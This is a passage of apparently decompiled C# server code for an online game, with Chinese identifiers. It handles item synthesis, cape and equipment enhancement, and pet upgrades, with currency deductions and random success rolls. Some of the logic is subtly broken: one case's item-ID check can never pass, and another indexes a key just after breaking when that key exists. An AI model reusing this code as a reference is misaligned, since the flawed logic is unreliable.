						HcItimesClass hcItimesClass93 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass93 = 合成物品表[1];
						}
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass93.物品id, 0), out var value129))
						{
							break;
						}
						if (value129.FLD_RESIDE2 != 12 || 装备栏包裹[hcItimesClass93.位置].Get物品ID != value129.FLD_PID)
						{
							MainForm.WriteLine(6, "合成系统 披风强化 BUG1[" + BitConverter.ToInt32(hcItimesClass93.物品id, 0) + "]-[" + base.UserName + "]");
							break;
						}
						CheckTreasureGems();
						if (base.FLD_RXPIONT < World.每次分解消耗元宝数)
						{
							系统提示("元宝不够了, 分解披风需要" + World.每次分解消耗元宝数 + "元宝。");
							break;
						}
						检察元宝数据(World.每次分解消耗元宝数, 0, "分解");
						RxjhClass.百宝记录(base.Userid, base.UserName, 0.0, "分解披风消耗", 1, World.每次分解消耗元宝数);
						SaveGemData();
						int num51 = RNG.Next(1, 100);
						int num53 = ((num51 > 0 && num51 <= 50) ? 1 : ((num51 > 50 && num51 <= 70) ? 1 : ((num51 <= 70 || num51 > 90) ? 1 : 1)));
						int value130 = 1000000545;
						int num54 = RNG.Next(1, 100);
						if (num54 < 90)
						{
							value130 = 1000000545;
						}
						增加物品2(BitConverter.GetBytes(RxjhClass.GetDBItmeId()), BitConverter.GetBytes(value130), num50, BitConverter.GetBytes(num53), new byte[56]);
						合成提示(num, 1, num53, 装备栏包裹[hcItimesClass93.位置]);
						减去物品(hcItimesClass93.位置, 1);
						合成物品表.Clear();
						合成系统解锁();
					}
					break;
				}
				case 219:
					try
					{
						if (合成物品表.Count <= 0)
						{
							break;
						}
						HcItimesClass hcItimesClass90 = null;
						HcItimesClass hcItimesClass91 = null;
						HcItimesClass hcItimesClass92 = null;
						if (合成物品表.Count < 3)
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
							break;
						}
						if (合成物品表.ContainsKey(0))
						{
							hcItimesClass90 = 合成物品表[0];
						}
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass91 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass92 = 合成物品表[2];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass90.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass90.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass91.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass91.物品全局ID, 0) || ((BitConverter.ToInt64(装备栏包裹[hcItimesClass92.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass92.物品全局ID, 0)) ? true : false))
						{
							break;
						}
						hcItimesClass91.得到属性();
						hcItimesClass91.强化属性阶段();
						hcItimesClass92.强化属性阶段();
						if (装备栏包裹[hcItimesClass90.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass90.位置]);
						}
						else if (装备栏包裹[hcItimesClass91.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass90.位置]);
						}
						else
						{
							if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass90.物品id, 0), out var value127))
							{
								break;
							}
							if (value127.FLD_RESIDE2 != 12)
							{
								string[] array37 = new string[5] { "合成系统 披风强化BUG[", null, null, null, null };
								array37[1] = BitConverter.ToInt32(hcItimesClass90.物品id, 0).ToString();
								array37[2] = "]-[";
								array37[3] = BitConverter.ToInt32(hcItimesClass92.物品id, 0).ToString();
								array37[4] = "]";
								MainForm.WriteLine(6, string.Concat(array37));
							}
							else if (BitConverter.ToInt32(hcItimesClass92.物品id, 0) != 1000000545 && BitConverter.ToInt32(hcItimesClass92.物品id, 0) != 1000001168)
							{
								string[] array2 = new string[5] { "合成系统 披风强化BUG[", null, null, null, null };
								array2[1] = BitConverter.ToInt32(hcItimesClass90.物品id, 0).ToString();
								array2[2] = "]-[";
								array2[3] = BitConverter.ToInt32(hcItimesClass92.物品id, 0).ToString();
								array2[4] = "]";
								MainForm.WriteLine(6, string.Concat(array2));
							}
							else
							{
								if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass90.物品id, 0), out var value128))
								{
									break;
								}
								if (value128.FLD_RESIDE2 != 12)
								{
									MainForm.WriteLine(6, "合成系统 披风强化BUG[" + BitConverter.ToInt32(hcItimesClass91.物品id, 0) + "]");
									break;
								}
								hcItimesClass90.强化类型 = 4;
								hcItimesClass90.强化数量 = hcItimesClass91.强化数量;
								if (hcItimesClass90.强化数量 > World.披风强化最大数量)
								{
									hcItimesClass90.强化数量 = World.披风强化最大数量;
								}
								hcItimesClass90.设置阶段属性();
								if (BitConverter.ToInt32(装备栏包裹[hcItimesClass90.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass90.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass90.物品全局ID, 0)) ? true : false))
								{
									减去物品(hcItimesClass90.位置, 1);
									增加物品(hcItimesClass90.物品全局ID, hcItimesClass90.物品id, hcItimesClass90.位置, hcItimesClass90.物品数量, hcItimesClass91.物品属性);
								}
								装备栏包裹[hcItimesClass90.位置].锁定 = false;
								减去物品(hcItimesClass91.位置, 1);
								减去物品(hcItimesClass92.位置, 1);
								合成物品表.Clear();
								合成系统解锁();
								元宝合成开关 = 0;
								合成提示(num, 1, 0, 装备栏包裹[hcItimesClass90.位置]);
							}
							break;
						}
					}
					catch (Exception ex50)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 披风合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex50.Message);
					}
					break;
				case 220:
					try
					{
						if (合成物品表.TryGetValue(1, out var value126))
						{
							装备栏包裹[value126.位置].锁定 = false;
							合成提示(num, 1, 0, 装备栏包裹[value126.位置]);
						}
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
					}
					catch (Exception ex49)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex49.Message);
					}
					break;
				case 221:
					try
					{
						ItmeClass value124 = new ItmeClass();
						if (装备栏包裹[num30].锁定 || 装备栏包裹[num30].物品绑定 || ((!World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out value124)) ? true : false))
						{
							break;
						}
						if (value124.FLD_LEVEL < 130)
						{
							系统提示("只有130级以上的武器/衣服/护手/鞋子/内甲才能升真。");
						}
						else if (value124.FLD_UP_LEVEL == 1)
						{
							系统提示("不能升真的装备。");
						}
						else if (value124.FLD_RESIDE2 != 4 && value124.FLD_RESIDE2 != 1 && value124.FLD_RESIDE2 != 2 && value124.FLD_RESIDE2 != 5 && ((value124.FLD_RESIDE2 != 6) ? true : false))
						{
							系统提示("只有130级以上的武器/衣服/护手/鞋子/内甲才能升真。");
						}
						else if (value124.FLD_RESIDE2 == 6)
						{
							if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0)
							{
								goto IL_1d0a8;
							}
							系统提示("只有合成2阶段的内甲才能升级。");
						}
						else
						{
							if (装备栏包裹[num30].FLD_MAGIC1 != 0 && 装备栏包裹[num30].FLD_MAGIC2 != 0 && 装备栏包裹[num30].FLD_MAGIC3 != 0 && 装备栏包裹[num30].FLD_MAGIC4 != 0)
							{
								goto IL_1d0a8;
							}
							系统提示("只有合成4阶段的装备才能升级。");
						}
						goto end_IL_1ceab;
						IL_1d0a8:
						if (!合成物品表.ContainsKey(1))
						{
							int 钱数 = (合成手续费 = 计算合成强化费用(value124, num30, num));
							HcItimesClass hcItimesClass32 = new HcItimesClass();
							hcItimesClass32.位置 = num30;
							hcItimesClass32.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value125 = hcItimesClass32;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value125);
							合成提示(num, 1, 钱数, 装备栏包裹[num30]);
						}
						end_IL_1ceab:;
					}
					catch (Exception ex48)
					{
						MainForm.WriteLine(1, "合成系统 装备升真 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex48.Message);
					}
					break;
				case 222:
					try
					{
						if (合成物品表.Count != 0 && 合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass89 = 合成物品表[1];
							if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value122) && (value122.FLD_PID == 1000000853 || value122.FLD_PID == 1000000854 || value122.FLD_PID == 1008001137 || value122.FLD_PID == 1008001138) && World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[hcItimesClass89.位置].物品ID, 0), out var value123) && (value123.FLD_RESIDE2 != 4 || value122.FLD_PID == 1000000853 || value122.FLD_PID == 1008001137) && ((value123.FLD_RESIDE2 != 1 && value123.FLD_RESIDE2 != 2 && value123.FLD_RESIDE2 != 5 && value123.FLD_RESIDE2 != 6) || value122.FLD_PID == 1000000854 || value122.FLD_PID == 1008001138) && !合成物品表.ContainsKey(2))
							{
								合成物品表.TryAdd(2, new HcItimesClass
								{
									位置 = num30,
									物品 = 装备栏包裹[num30].物品_byte
								});
								装备栏包裹[num30].锁定 = true;
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
					}
					catch (Exception ex47)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex47.Message);
					}
					break;
				case 223:
					try
					{
						if (合成物品表.Count == 0)
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
						else if (!合成物品表.ContainsKey(3))
						{
							合成物品表.TryAdd(3, new HcItimesClass
							{
								位置 = num30,
								物品 = 装备栏包裹[num30].物品_byte
							});
							装备栏包裹[num30].锁定 = true;
							合成提示(num, 1, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex46)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex46.Message);
					}
					break;
				case 224:
					try
					{
						if (合成物品表.Count <= 0)
						{
							break;
						}
						HcItimesClass hcItimesClass85 = null;
						HcItimesClass hcItimesClass86 = null;
						HcItimesClass hcItimesClass88 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass85 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass86 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(3))
						{
							hcItimesClass88 = 合成物品表[3];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass85.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass85.物品全局ID, 0) || BitConverter.ToInt64(装备栏包裹[hcItimesClass86.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass86.物品全局ID, 0) || (hcItimesClass88 != null && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass88.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass88.物品全局ID, 0)) ? true : false)))
						{
							break;
						}
						hcItimesClass85.得到属性();
						hcItimesClass85.强化属性阶段();
						hcItimesClass86.强化属性阶段();
						ItmeClass value120;
						if (装备栏包裹[hcItimesClass85.位置].物品绑定)
						{
							合成物品表.Clear();
						}
						else if (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass85.物品id, 0), out value120))
						{
							if (value120.FLD_RESIDE2 != 1 && value120.FLD_RESIDE2 != 2 && value120.FLD_RESIDE2 != 4 && value120.FLD_RESIDE2 != 5 && ((value120.FLD_RESIDE2 != 6) ? true : false))
							{
								合成物品表.Clear();
								break;
							}
							if (hcItimesClass85.强化数量 < 7)
							{
								合成提示(21, 3, 0, 装备栏包裹[hcItimesClass85.位置]);
								合成物品表.Clear();
								系统提示("只有达到7或7以上强化阶段的装备才能升级。");
								break;
							}
							switch (World.装备提真消耗)
							{
							case 0:
								CheckTreasureGems();
								if (base.FLD_RXPIONT < World.装备提真数量)
								{
									系统提示("元宝不够了, 提真此装备需花费" + World.装备提真数量 + "元宝。");
									return;
								}
								检察元宝数据(World.装备提真数量, 0, "提真");
								SaveGemData();
								break;
							case 1:
								CheckTreasureGems();
								if (base.FLD_Coin < World.装备提真数量)
								{
									系统提示("元宝不够了, 提真此装备需花费" + World.装备提真数量 + "赠品元宝。");
									return;
								}
								CheckGemPointsData(World.装备提真数量, 0, "提真");
								SaveGemData();
								break;
							case 2:
								if (base.Player_Money < World.装备提真数量)
								{
									系统提示("游戏币不够了, 提真此装备需花费" + World.装备提真数量 + "两。");
									return;
								}
								base.Player_Money -= World.装备提真数量;
								更新金钱和负重();
								break;
							default:
								系统提示("系统错误221, 请联系管理员。");
								return;
							}
							if (合成手续费 <= 0)
							{
								goto IL_1d9de;
							}
							if (base.Player_Money >= 合成手续费)
							{
								base.Player_Money -= 合成手续费;
								更新金钱和负重();
								goto IL_1d9de;
							}
							合成提示(11, 4, 0, 装备栏包裹[hcItimesClass85.位置]);
							合成物品表.Clear();
						}
						else
						{
							合成物品表.Clear();
						}
						goto end_IL_1d509;
						IL_1d9de:
						double num47 = RNG.Next(0, 100);
						double num48 = hcItimesClass85.属性1.数量 * 20 + hcItimesClass85.属性2.数量 * 20 + hcItimesClass85.属性3.数量 * 20 + hcItimesClass85.属性4.数量 * 20 + 10;
						double num49 = 0.0;
						if (value120.FLD_RESIDE2 == 6)
						{
							num48 += 40.0;
						}
						if (hcItimesClass88 != null)
						{
							num47 += (double)幸运符加成(BitConverter.ToInt32(hcItimesClass88.物品id, 0));
						}
						if (hcItimesClass86 != null)
						{
							num47 += (double)真龙宝器(BitConverter.ToInt32(hcItimesClass86.物品id, 0));
						}
						num49 += (double)真龙宝器(BitConverter.ToInt32(hcItimesClass86.物品id, 0));
						if (元宝合成开关 == 1)
						{
							num47 += 5.0;
						}
						if (base.FLD_VIP == 1)
						{
							num47 += 100.0 * World.VIP合成率增加百分比;
						}
						if (World.装备升级率 != 0.0)
						{
							num47 += 100.0 * World.装备升级率;
						}
						if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
						{
							num47 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
						}
						if (base.FLD_装备_追加_合成成功率百分比 > 0.0)
						{
							num47 += 100.0 * base.FLD_装备_追加_合成成功率百分比 / 2.0;
						}
						byte[] 物品ID = hcItimesClass85.物品id;
						byte[] array36 = new byte[World.物品属性大小];
						Buffer.BlockCopy(hcItimesClass85.物品属性, 0, array36, 0, World.物品属性大小);
						if (num47 >= num48)
						{
							if ((value120.FLD_RESIDE2 == 6 && value120.FLD_NJ > 0) || ((value120.FLD_RESIDE2 != 6) ? true : false))
							{
								物品ID = BitConverter.GetBytes(BitConverter.ToInt32(hcItimesClass85.物品id, 0) + 1);
							}
							if (num49 > num48)
							{
								Buffer.BlockCopy(BitConverter.GetBytes(2), 0, array36, 52, 4);
							}
							RxjhClass.合成记录(base.Userid, base.UserName, value120.ItmeNAME, num, "装备升真", "成功", 装备栏包裹[hcItimesClass85.位置]);
							合成提示(num, 1, 合成手续费, 装备栏包裹[hcItimesClass85.位置]);
						}
						else
						{
							RxjhClass.合成记录(base.Userid, base.UserName, value120.ItmeNAME, num, "装备升真", "失败", 装备栏包裹[hcItimesClass85.位置]);
							合成提示(num, 0, 合成手续费, 装备栏包裹[hcItimesClass85.位置]);
						}
						减去物品(hcItimesClass86.位置, 1);
						if (hcItimesClass88 != null)
						{
							减去物品(hcItimesClass88.位置, 1);
						}
						if (BitConverter.ToInt32(装备栏包裹[hcItimesClass85.位置].物品ID, 0) != 0 && ((BitConverter.ToInt64(装备栏包裹[hcItimesClass85.位置].物品全局ID, 0) == BitConverter.ToInt64(hcItimesClass85.物品全局ID, 0)) ? true : false))
						{
							减去物品(hcItimesClass85.位置, 1);
							增加物品(hcItimesClass85.物品全局ID, 物品ID, hcItimesClass85.位置, hcItimesClass85.物品数量, array36);
						}
						装备栏包裹[hcItimesClass85.位置].锁定 = false;
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						合成手续费 = 0;
						end_IL_1d509:;
					}
					catch (Exception ex45)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 合成属性 合成 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex45.Message);
					}
					break;
				case 260:
					try
					{
						合成物品表.Clear();
						合成系统解锁();
						元宝合成开关 = 0;
						打开仓库中 = false;
					}
					catch (Exception ex44)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化转移符[武器] 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex44.Message);
					}
					break;
				case 261:
					try
					{
						int num45 = BitConverter.ToUInt16(封包数据, 14);
						if (装备栏包裹[num45].Get物品ID != 1008001061 && 装备栏包裹[num45].Get物品ID != 1008001062)
						{
							break;
						}
						int num46 = BitConverter.ToInt32(封包数据, 18);
						if ((uint)(num46 - 1008001061) > 1u || 装备栏包裹[num30].锁定 || 装备栏包裹[num30].物品绑定 || 装备栏包裹[num30].FLD_强化数量 < 11)
						{
							return;
						}
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value118))
						{
							if (value118.FLD_LEVEL < 130)
							{
								return;
							}
							if (value118.FLD_RESIDE2 == 4)
							{
								if (装备栏包裹[num45].Get物品ID != 1008001061)
								{
									return;
								}
							}
							else if (value118.FLD_RESIDE2 != 1 || 装备栏包裹[num45].Get物品ID != 1008001062)
							{
								return;
							}
							if (!合成物品表.ContainsKey(1))
							{
								HcItimesClass hcItimesClass5 = new HcItimesClass();
								hcItimesClass5.位置 = num30;
								hcItimesClass5.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value119 = hcItimesClass5;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(1, value119);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
						else
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
						return;
					}
					catch (Exception ex42)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex42.Message);
					}
					break;
				case 262:
					try
					{
						int num43 = BitConverter.ToUInt16(封包数据, 14);
						if (装备栏包裹[num43].Get物品ID != 1008001061 && 装备栏包裹[num43].Get物品ID != 1008001062)
						{
							break;
						}
						int num44 = BitConverter.ToInt32(封包数据, 18);
						if ((uint)(num44 - 1008001061) > 1u || 装备栏包裹[num30].锁定 || 装备栏包裹[num30].物品绑定)
						{
							return;
						}
						if (World.Itme.TryGetValue(BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0), out var value116))
						{
							if (value116.FLD_LEVEL < 140)
							{
								return;
							}
							if (value116.FLD_RESIDE2 == 4)
							{
								if (装备栏包裹[num43].Get物品ID != 1008001061)
								{
									return;
								}
							}
							else if (value116.FLD_RESIDE2 != 1 || 装备栏包裹[num43].Get物品ID != 1008001062)
							{
								return;
							}
							if (!合成物品表.ContainsKey(2))
							{
								HcItimesClass hcItimesClass6 = new HcItimesClass();
								hcItimesClass6.位置 = num30;
								hcItimesClass6.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value117 = hcItimesClass6;
								装备栏包裹[num30].锁定 = true;
								合成物品表.TryAdd(2, value117);
								合成提示(num, 1, 0, 装备栏包裹[num30]);
							}
						}
						else
						{
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
						return;
					}
					catch (Exception ex41)
					{
						MainForm.WriteLine(1, "合成系统 合成属性 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex41.Message);
					}
					break;
				case 263:
					try
					{
						if (合成物品表.Count <= 1)
						{
							break;
						}
						int num38 = BitConverter.ToUInt16(封包数据, 14);
						int num39 = BitConverter.ToInt32(封包数据, 18);
						if (装备栏包裹[num38].Get物品ID != 1008001061 || 装备栏包裹[num38].Get物品ID != 1008001062 || 装备栏包裹[num38].Get物品ID != num39)
						{
							break;
						}
						HcItimesClass hcItimesClass83 = null;
						HcItimesClass hcItimesClass84 = null;
						if (合成物品表.ContainsKey(1))
						{
							break;
						}
						hcItimesClass83 = 合成物品表[1];
						if (!合成物品表.ContainsKey(2))
						{
							break;
						}
						hcItimesClass84 = 合成物品表[2];
						if (装备栏包裹[hcItimesClass83.位置].得到全局ID() == hcItimesClass83.得到全局ID() && 装备栏包裹[hcItimesClass84.位置].得到全局ID() == hcItimesClass84.得到全局ID())
						{
							hcItimesClass83.得到属性();
							hcItimesClass83.强化属性阶段();
							hcItimesClass84.得到属性();
							hcItimesClass84.强化属性阶段();
							double num40 = RNG.Next(20, 180);
							double num42 = hcItimesClass83.强化数量 * 6;
							if (hcItimesClass83.强化数量 < 12)
							{
								num42 = hcItimesClass83.强化数量 * 10;
							}
							else if (hcItimesClass83.强化数量 <= 15)
							{
								num42 = hcItimesClass83.强化数量 * 6;
							}
							if (元宝合成开关 == 1)
							{
								num40 += 5.0;
							}
							if (公有药品.ContainsKey(1008000312))
							{
								num40 += 5.0;
							}
							if (base.FLD_VIP == 1)
							{
								num40 += 100.0 * World.VIP合成率增加百分比;
							}
							if (base.FLD_人物_追加_合成成功率百分比 != 0.0)
							{
								num40 += 100.0 * base.FLD_人物_追加_合成成功率百分比;
							}
							if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
							{
								num40 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
							}
							if (GM模式 == 8)
							{
								num42 = 0.0;
							}
							if (num40 >= num42)
							{
								hcItimesClass84.强化类型 = 1;
								hcItimesClass84.强化数量 = hcItimesClass83.强化数量;
								hcItimesClass84.设置阶段属性();
								减去物品(hcItimesClass83.位置, 1);
								减去物品(hcItimesClass84.位置, 1);
								增加物品(hcItimesClass84.物品全局ID, hcItimesClass84.物品id, hcItimesClass84.位置, hcItimesClass84.物品数量, hcItimesClass83.物品属性);
								合成提示(num, 1, 0, 装备栏包裹[hcItimesClass84.位置]);
							}
							else
							{
								合成提示(num, 0, 0, 装备栏包裹[hcItimesClass83.位置]);
							}
							减去物品(num38, 1);
							合成物品表.Clear();
							合成系统解锁();
							打开仓库中 = false;
							元宝合成开关 = 0;
							合成手续费 = 0;
						}
					}
					catch (Exception ex40)
					{
						MainForm.WriteLine(1, "转移符异常" + base.Userid + "]-[" + base.UserName + "]" + ex40.Message);
					}
					break;
				case 270:
					try
					{
						if (合成物品表.TryGetValue(1, out var value115))
						{
							装备栏包裹[value115.位置].锁定 = false;
							合成物品表.Clear();
							Buffer.BlockCopy(array12, 0, array, 10, 2);
							合成系统解锁();
						}
						元宝合成开关 = 0;
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex39)
					{
						元宝合成开关 = 0;
						MainForm.WriteLine(1, "合成系统 强化合成 合成4 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex39.Message);
					}
					return;
				case 271:
					try
					{
						if (!合成物品表.ContainsKey(1))
						{
							if (装备栏包裹[num30].物品绑定)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
								return;
							}
							HcItimesClass hcItimesClass7 = new HcItimesClass();
							hcItimesClass7.位置 = num30;
							hcItimesClass7.物品 = 装备栏包裹[num30].物品_byte;
							HcItimesClass value114 = hcItimesClass7;
							装备栏包裹[num30].锁定 = true;
							合成物品表.TryAdd(1, value114);
							合成提示(num, 0, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex38)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成1 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex38.Message);
					}
					return;
				case 272:
					try
					{
						if (!合成物品表.ContainsKey(1))
						{
							return;
						}
						if (合成物品表.ContainsKey(1))
						{
							HcItimesClass hcItimesClass82 = 合成物品表[1];
							if (合成物品表.Count == 0)
							{
								合成提示(num, 2, 0, 装备栏包裹[num30]);
							}
							else
							{
								if (BitConverter.ToInt32(装备栏包裹[num30].物品数量, 0) < 1 || (World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass82.物品id, 0), out var value112) && value112.FLD_PID != 1000001170 && value112.FLD_PID != 1000001171 && value112.FLD_PID != 1000001172 && value112.FLD_PID != 1000001173 && value112.FLD_PID != 1000001174 && ((value112.FLD_PID != 1000001175) ? true : false)))
								{
									return;
								}
								if (BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 800000060 && ((BitConverter.ToInt32(装备栏包裹[num30].物品ID, 0) != 1008001988) ? true : false))
								{
									合成提示(num, 7, 0, 装备栏包裹[num30]);
									return;
								}
								HcItimesClass hcItimesClass8 = new HcItimesClass();
								hcItimesClass8.位置 = num30;
								hcItimesClass8.物品 = 装备栏包裹[num30].物品_byte;
								HcItimesClass value113 = hcItimesClass8;
								装备栏包裹[num30].锁定 = true;
								if (!合成物品表.ContainsKey(2))
								{
									合成物品表.TryAdd(2, value113);
									合成提示(num, 0, 0, 装备栏包裹[num30]);
								}
								return;
							}
						}
						else
						{
							合成提示(num, 5, 0, 装备栏包裹[num30]);
						}
					}
					catch (Exception ex37)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成2 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex37.Message);
					}
					return;
				case 273:
					try
					{
						if (合成物品表.Count == 0 || (合成物品表.ContainsKey(5) ? true : false))
						{
							return;
						}
						HcItimesClass hcItimesClass9 = new HcItimesClass();
						hcItimesClass9.位置 = num30;
						hcItimesClass9.物品 = 装备栏包裹[num30].物品_byte;
						HcItimesClass value111 = hcItimesClass9;
						装备栏包裹[num30].锁定 = true;
						合成物品表.TryAdd(5, value111);
						合成提示(num, 0, 0, 装备栏包裹[num30]);
					}
					catch (Exception ex36)
					{
						MainForm.WriteLine(1, "合成系统 强化合成 合成3 出错![" + base.Userid + "]-[" + base.UserName + "]" + ex36.Message);
						return;
					}
					break;
				case 274:
					try
					{
						if (合成物品表.Count <= 0)
						{
							return;
						}
						HcItimesClass hcItimesClass79 = null;
						HcItimesClass hcItimesClass80 = null;
						HcItimesClass hcItimesClass81 = null;
						if (合成物品表.ContainsKey(1))
						{
							hcItimesClass79 = 合成物品表[1];
						}
						if (合成物品表.ContainsKey(2))
						{
							hcItimesClass80 = 合成物品表[2];
						}
						if (合成物品表.ContainsKey(5))
						{
							hcItimesClass81 = 合成物品表[5];
						}
						if (BitConverter.ToInt64(装备栏包裹[hcItimesClass79.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass79.物品全局ID, 0) || hcItimesClass80 == null || (hcItimesClass80 != null && (BitConverter.ToInt64(装备栏包裹[hcItimesClass80.位置].物品全局ID, 0) != BitConverter.ToInt64(hcItimesClass80.物品全局ID, 0) || (BitConverter.ToInt32(装备栏包裹[hcItimesClass80.位置].物品ID, 0) != 1008001988 && ((BitConverter.ToInt32(装备栏包裹[hcItimesClass80.位置].物品ID, 0) != 800000060) ? true : false)))))
						{
							return;
						}
						hcItimesClass79.得到属性();
						hcItimesClass79.强化属性阶段();
						if (!World.Itme.TryGetValue(BitConverter.ToInt32(hcItimesClass79.物品id, 0), out var value109))
						{
							return;
						}
						if (value109.FLD_RESIDE2 != 16)
						{
							string[] array34 = new string[5] { "合成系统 强化 BUG1[", null, null, null, null };
							array34[1] = BitConverter.ToInt32(hcItimesClass79.物品id, 0).ToString();
							array34[2] = "]-[";
							array34[3] = BitConverter.ToInt32(hcItimesClass80.物品id, 0).ToString();
							array34[4] = "]";
							MainForm.WriteLine(6, string.Concat(array34));
							return;
						}
						if (装备栏包裹[hcItimesClass79.位置].物品绑定)
						{
							合成提示(num, 2, 0, 装备栏包裹[hcItimesClass79.位置]);
							return;
						}
						Random random = new Random();
						string[] array35 = World.灵宠强化总概率.Split(';');
						double num35 = random.Next(int.Parse(array35[0]), int.Parse(array35[1]));
						double num36 = hcItimesClass79.强化数量 * 10;
						double num37 = ((hcItimesClass79.强化数量 <= 10) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化一阶段概率) : ((hcItimesClass79.强化数量 > 10 && hcItimesClass79.强化数量 <= 20) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化一阶段概率) : ((hcItimesClass79.强化数量 > 20 && hcItimesClass79.强化数量 <= 30) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化二阶段概率) : ((hcItimesClass79.强化数量 > 30 && hcItimesClass79.强化数量 <= 40) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化三阶段概率) : ((hcItimesClass79.强化数量 > 40 && hcItimesClass79.强化数量 <= 50) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化四阶段概率) : ((hcItimesClass79.强化数量 > 50 && hcItimesClass79.强化数量 <= 60) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化五阶段概率) : ((hcItimesClass79.强化数量 <= 60 || hcItimesClass79.强化数量 > 70) ? ((double)hcItimesClass79.强化数量 * World.灵宠强化七阶段概率) : ((double)hcItimesClass79.强化数量 * World.灵宠强化六阶段概率))))))));
						if (hcItimesClass79.强化数量 >= World.灵宠强化最大数量)
						{
							return;
						}
						if (hcItimesClass80 != null)
						{
							num35 += (double)灵宠披风取玉(BitConverter.ToInt32(hcItimesClass80.物品id, 0));
						}
						if (hcItimesClass81 != null)
						{
							switch (BitConverter.ToInt32(hcItimesClass81.物品id, 0))
							{
							case 800000003:
								num35 += 5.0;
								break;
							case 800000004:
								num35 += 10.0;
								break;
							case 800000005:
								num35 += 15.0;
								break;
							case 800000029:
								num35 += 20.0;
								break;
							case 1008000136:
								num35 += 25.0;
								break;
							}
						}
						if (公有药品.ContainsKey(1008000312))
						{
							num35 += 10.0;
						}
						if (base.FLD_装备_追加_合成成功率百分比 != 0.0)
						{
							num35 += 100.0 * base.FLD_装备_追加_合成成功率百分比;
						}
						if (元宝合成开关 == 1)
						{
							num35 += 5.0;
						}
